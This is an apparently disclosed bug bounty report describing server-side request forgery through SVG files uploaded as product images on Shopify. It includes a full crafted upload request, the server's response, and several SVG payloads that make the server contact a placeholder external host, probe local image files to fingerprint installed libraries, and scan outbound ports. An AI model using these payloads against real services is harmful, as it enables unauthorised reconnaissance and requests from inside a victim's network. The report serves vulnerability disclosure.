# SVG Server Side Request Forgery (SSRF)

## Report Details
- **Report ID**: 223203
- **URL**: https://hackerone.com/reports/223203
- **State**: Closed
- **Severity**: low
- **Submitted**: 2017-04-23T14:43:15.224Z
- **Disclosed**: 2017-09-22T09:09:19.529Z

## Reporter
- **Username**: floyd
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify

## Vulnerability Information
I found an issue which seems to be regression of the following issue: https://hackerone.com/reports/97501 . It seems your input validaton is not sufficient and the file is getting processed before your implemented check for valid file types.

When adding a new product in the store, images for the product can be uploaded. When modifying the HTTP request that is sent, an attacker can do Server Side Request Forgery. The attacker simply has to specify a filename ending in .png, but use Content-Type image/svg+xml and the file content as well an SVG file.

The following requests leads to an DNS and HTTP interaction with <EXAMPLE_SERVER>, a placeholder for any server on the Internet:

```
POST /admin/products/9577763394/images.json HTTP/1.1
Host: 667667.myshopify.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: */*
Accept-Language: en-US,en;q=0.5
X-CSRF-Token: ca/m3aW88KsRSpDmudAHJrJBPrXdClc4T/D88ZltUf6E0YUeKneGI5CZtDJFo6wHg+EY+Q4h0uPU8rqnmm/Ydw==
X-Requested-With: XMLHttpRequest
Content-Length: 671
Content-Type: multipart/form-data; boundary=---------------------------1184233411771235065729422741
Cookie: <REDACTED>
Connection: close

-----------------------------1184233411771235065729422741
Content-Disposition: form-data; name="image[attachment]"; filename="NagKSvgXlink2.png"
Content-Type: image/svg+xml

<?xml version="1.0" encoding="UTF-8" standalone="no"?><svg xmlns:svg="http://www.w3.org/2000/svg" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200"><image height="200" width="200" xlink:href="http://<EXAMPLE_SERVER>/image.jpeg" /></svg>
-----------------------------1184233411771235065729422741
Content-Disposition: form-data; name="image[alt]"


-----------------------------1184233411771235065729422741--
```

Although the Shopify server responds with a HTTP 422 message, the interaction takes place with <EXAMPLE_SERVER>:

```
HTTP/1.1 422 Unprocessable Entity
Server: nginx
Date: Fri, 21 Apr 2017 11:17:02 GMT
Content-Type: application/json; charset=utf-8
Connection: close
Referrer-Policy: origin-when-cross-origin
X-Frame-Options: DENY
X-ShopId: 19430493
X-ShardId: 1
X-Stats-UserId: 110274114
Cache-Control: no-cache, no-store
Set-Cookie: request_method=POST; path=/
Content-Security-Policy: default-src 'self' data: blob: 'unsafe-inline' 'unsafe-eval' https://* shopify-pos://*; child-src 'self' https://* shopify-pos://*; connect-src 'self' wss://* https://*; script-src https://cdn.shopify.com https://checkout.shopifycs.com https://js-agent.newrelic.com https://bam.nr-data.net https://dme0ih8comzn4.cloudfront.net https://api.stripe.com https://mpsnare.iesnare.com https://appcenter.intuit.com https://www.paypal.com https://stats.g.doubleclick.net https://www.google-analytics.com https://visitors.shopify.com https://v.shopify.com https://widget.intercom.io https://js.intercomcdn.com 'self' 'unsafe-inline' 'unsafe-eval'; upgrade-insecure-requests; report-uri /csp-report?source%5Baction%5D=create&source%5Bapp%5D=Shopify&source%5Bcontroller%5D=admin%2Fproduct_images&source%5Bsection%5D=admin&source%5Buuid%5D=834e8c11-d80b-4d00-a213-78619aebe696
X-Content-Type-Options: nosniff
X-Download-Options: noopen
X-Permitted-Cross-Domain-Policies: none
X-XSS-Protection: 1; mode=block; report=/xss-report?source%5Baction%5D=create&source%5Bapp%5D=Shopify&source%5Bcontroller%5D=admin%2Fproduct_images&source%5Bsection%5D=admin&source%5Buuid%5D=834e8c11-d80b-4d00-a213-78619aebe696
X-Dc: ash,chi2
X-Request-ID: 834e8c11-d80b-4d00-a213-78619aebe696
Content-Length: 109

{"errors":{"image":["The uploaded image is corrupt and cannot be processed. Please try a different image."]}}
```

The interaction with <EXAMPLE_SERVER> for HTTP is:

```
GET /image.jpeg HTTP/1.0
Host: <EXAMPLE_SERVER>
Accept-Encoding: gzip 
```

To further analyse the issue, let's only talk about the SVG file content in the request:

```
<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<svg xmlns:svg="http://www.w3.org/2000/svg" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200">
<image height="200" width="200" xlink:href="http://<EXAMPLE_SERVER>/image.jpeg" />
</svg>
```


A couple of facts:
- When changing the `http://<EXAMPLE_SERVER>/image.jpeg` part to other protocols, only `http://` and `ftp://` lead to interaction with a server on the Internet. No other protocol on the following list does: https://www.w3.org/wiki/UriSchemes . 
- I tried to connect with the HTTP and FTP protocol to all 65535 TCP ports on my server. Shopify seems to have outbound filters on only one TCP port, 113. On all other ports I got a TCP SYN packet with both protocols. Often companies detect this kind of port scan from their network hosts, I don't know if you did.
- The parser doesn't mind a static entity:

```
<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!DOCTYPE testingxxe [ <!ENTITY xml "eXtensible Markup Language"> ]>
<svg xmlns:svg="http://www.w3.org/2000/svg" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200">
<image height="30" width="30" xlink:href="http://<EXAMPLE_SERVER>/image.jpg" />
<text x="0" y="20" font-size="20">&xml;</text>
</svg>
```
- The "a billion laughs" attack - see https://en.wikipedia.org/wiki/Billion_laughs - is probably possible as static entities are allowed, but DoS is not in the scope of your bug bounty program.
- However, the parser *doesn't* like SYSTEM Entities, we can *not* specify a different DTD file, add SYSTEM entities or any other XXE attack.

But we can use two image references and as long as the first URL returns a valid image, the second one is requested as well:

```
<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<svg xmlns:svg="http://www.w3.org/2000/svg" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200">
<image height="30" width="30" xlink:href="http://<EXAMPLE_SERVER>:81/example.png" />
<image height="30" width="30" xlink:href="http://<EXAMPLE_SERVER>:999/example.png" />
<text x="0" y="20" font-size="20">test</text>
</svg>
```

This results in a Is-Picture-Present-Oracle. By sending a local path first we can find out if a file that includes a picture is present on the file system. Because we get an interaction for the following SVG, we know the picture /lib/plymouth/ubuntu_logo.png is present on the system (this does *not* work with non-image files like /etc/passwd):

```
<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<svg xmlns:svg="http://www.w3.org/2000/svg" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200">
<image height="30" width="30" xlink:href="/lib/plymouth/ubuntu_logo.png" />
<image height="30" width="30" xlink:href="http://<EXAMPLE_SERVER>:999/example.png" />
<text x="0" y="20" font-size="20">test</text>
</svg>
```

The following pictures allow us to fingerprint the versions of libraries installed on your server (these three files are present on your servers):
- /usr/share/doc/libpng12-dev/examples/pngtest.png (you have libpng12-dev installed, etc.)
- /usr/share/doc/libfreetype6/tutorial/metrics.png 
- /usr/share/doc/libexpat1-dev/expat.html/expat.png



## Attachments
No attachments
